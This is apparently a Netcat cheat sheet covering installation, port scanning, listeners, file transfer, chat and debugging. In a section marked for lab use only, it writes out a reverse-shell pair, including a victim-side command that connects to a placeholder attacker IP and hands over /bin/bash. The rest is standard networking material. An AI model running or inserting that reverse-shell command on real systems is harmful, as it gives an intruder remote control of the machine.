---
title: 🔗 Netcat
---

# Netcat

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Installation](#2-installation)
3. [Basic Commands](#3-basic-commands)
4. [Check / Scan Ports](#4-check--scan-ports)
5. [Server Mode / Listener](#5-server-mode--listener)
6. [Chat via Netcat](#6-chat-via-netcat)
7. [Reverse Shell (Test/Training)](#7-reverse-shell-testtraining)
8. [Combination with Scripts](#8-combination-with-scripts)
9. [Logging / Debugging](#9-logging--debugging)
10. [Best Practices / Security](#10-best-practices--security)

---

## 1. Introduction

Netcat (nc) is a versatile network tool for Linux, macOS, and Windows, often referred to as the "Swiss Army Knife" for TCP/IP.

### Key Features

- Establish connections to TCP/UDP ports
- Scan ports
- Send and receive data over networks
- Create backdoors / reverse shells (for testing purposes only)
- Scripting and debugging of network services

---

## 2. Installation

```bash
# Linux (Debian/Ubuntu)
sudo apt install netcat

# Linux (RedHat/CentOS)
sudo yum install nc

# macOS (Homebrew)
brew install netcat

# Windows (Nmap Netcat)
# https://nmap.org/ncat/
```

---

## 3. Basic Commands

### 3.1 Connect to a Server

```bash
nc <hostname> <port>
# Example:
nc example.com 80
```

### 3.2 Send/Receive Data

- After connection, you can type data and it will be sent.
- Incoming data from the server appears in the terminal.

### 3.3 With TCP and UDP

```bash
# TCP (default)
nc -v <host> <port>
# UDP
nc -u <host> <port>
```

---

## 4. Check / Scan Ports

### 4.1 Simple Port Check

```bash
nc -zv <host> <port>
# Example: check ports 20-25
nc -zv example.com 20-25
```

- `-z` : scan only, don't send data
- `-v` : verbose, shows status

### 4.2 Multiple Ports

```bash
nc -zv example.com 80 443 8080
```

---

## 5. Server Mode / Listener

### 5.1 Simple Listener

```bash
nc -l -p 1234
# or with verbose
nc -l -v -p 1234
```

- `-l` : listener (server mode)
- `-p` : port

### 5.2 Receive File

```bash
nc -l -p 1234 > received_file.txt
```

### 5.3 Send File

```bash
nc <host> 1234 < file.txt
```

---

## 6. Chat via Netcat

### 6.1 Simple Connection

- Terminal A (Listener):

```bash
  nc -l -p 1234
```
  
- Terminal B (Client):

```bash
  nc <IP_A> 1234
```
  
- Now you can send messages back and forth

---

## 7. Reverse Shell (Test/Training)

> Use only in your own lab environments!

### 7.1 Listener on Attacker Side

```bash
nc -l -p 4444 -v
```

### 7.2 Shell on Victim Side

```bash
nc <attacker_ip> 4444 -e /bin/bash
```

- `-e` : execute program after connection
- Windows: `cmd.exe` instead of `/bin/bash`

---

## 8. Combination with Scripts

- Send data via pipes

```bash
  cat file.txt | nc <host> <port>
```

- Send output of a command
  
```bash
  ls -la | nc <host> <port>
```

---

## 9. Logging / Debugging

- Verbose option
  
```bash
  nc -v <host> <port>
```

- Multiple verbose

  ```bash
  nc -vv <host> <port>
  ```

---

## 10. Best Practices / Security

- Never open netcat unsupervised with `-e` or `-c` on the internet
- Use only for test and debug purposes
- Observe firewall / IDS rules
- Alternatives like `ncat` (Nmap) for encrypted connections

---
